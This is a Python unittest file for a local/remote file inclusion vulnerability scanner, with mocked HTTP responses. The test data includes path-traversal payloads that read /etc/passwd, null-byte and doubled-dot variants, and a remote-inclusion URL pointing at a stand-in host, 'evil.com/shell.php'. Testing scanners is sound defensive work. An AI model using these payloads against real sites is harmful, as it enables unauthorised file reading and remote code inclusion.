import unittest
from unittest.mock import patch, MagicMock
import responses
from ..lfi_rfi import LFIRFIScanner

class TestLFIRFIScanner(unittest.TestCase):
    def setUp(self):
        self.target_url = "https://example.com"
        self.scanner = LFIRFIScanner(self.target_url)

    @responses.activate
    def test_parameter_detection(self):
        # Mock page with potential vulnerable parameters
        responses.add(
            responses.GET,
            self.target_url,
            body='<a href="page.php?file=about">About</a>',
            status=200
        )

        params = self.scanner.detect_parameters()
        self.assertIsInstance(params, list)
        self.assertIn('file', params)

    @responses.activate
    def test_lfi_detection(self):
        # Mock responses for LFI attempts
        responses.add(
            responses.GET,
            f"{self.target_url}/page.php?file=../../../etc/passwd",
            body="root:x:0:0:root:/root:/bin/bash",
            status=200
        )

        result = self.scanner.test_lfi_vulnerability(
            "/page.php",
            "file",
            "../../../etc/passwd"
        )
        self.assertTrue(result['vulnerable'])
        self.assertIn('root:', result['evidence'])

    @responses.activate
    def test_rfi_detection(self):
        # Mock responses for RFI attempts
        remote_code = "<?php echo 'RFI Test'; ?>"
        responses.add(
            responses.GET,
            f"{self.target_url}/page.php?file=http://evil.com/shell.php",
            body=remote_code,
            status=200
        )

        result = self.scanner.test_rfi_vulnerability(
            "/page.php",
            "file",
            "http://evil.com/shell.php"
        )
        self.assertTrue(result['vulnerable'])
        self.assertIn('php echo', result['evidence'])

    def test_generate_lfi_payloads(self):
        payloads = self.scanner.generate_lfi_payloads()
        self.assertIsInstance(payloads, list)
        self.assertGreater(len(payloads), 0)
        self.assertTrue(any('../' in p for p in payloads))
        self.assertTrue(any('etc/passwd' in p for p in payloads))

    def test_generate_rfi_payloads(self):
        payloads = self.scanner.generate_rfi_payloads()
        self.assertIsInstance(payloads, list)
        self.assertGreater(len(payloads), 0)
        self.assertTrue(any('http://' in p for p in payloads))
        self.assertTrue(any('.php' in p for p in payloads))

    @responses.activate
    def test_null_byte_injection(self):
        # Mock response for null byte attempt
        responses.add(
            responses.GET,
            f"{self.target_url}/page.php?file=../../../etc/passwd%00",
            body="root:x:0:0:",
            status=200
        )

        result = self.scanner.test_null_byte_injection(
            "/page.php",
            "file",
            "../../../etc/passwd\x00"
        )
        self.assertTrue(result['vulnerable'])
        self.assertIn('root:', result['evidence'])

    @responses.activate
    def test_path_traversal_detection(self):
        # Mock responses for path traversal attempts
        responses.add(
            responses.GET,
            f"{self.target_url}/page.php?file=....//....//etc/passwd",
            body="root:x:0:0:",
            status=200
        )

        result = self.scanner.test_path_traversal(
            "/page.php",
            "file",
            "....//....//etc/passwd"
        )
        self.assertTrue(result['vulnerable'])
        self.assertIn('root:', result['evidence'])

    @responses.activate
    def test_full_scan(self):
        # Mock initial page
        responses.add(
            responses.GET,
            self.target_url,
            body='<a href="page.php?file=test">Test</a>',
            status=200
        )

        # Mock vulnerable response
        responses.add(
            responses.GET,
            f"{self.target_url}/page.php?file=../../../etc/passwd",
            body="root:x:0:0:",
            status=200
        )

        results = self.scanner.run_scan()
        self.assertIsInstance(results, dict)
        self.assertIn('parameters_tested', results)
        self.assertIn('vulnerabilities', results)
        self.assertIn('payloads_tested', results)

if __name__ == '__main__':
    unittest.main()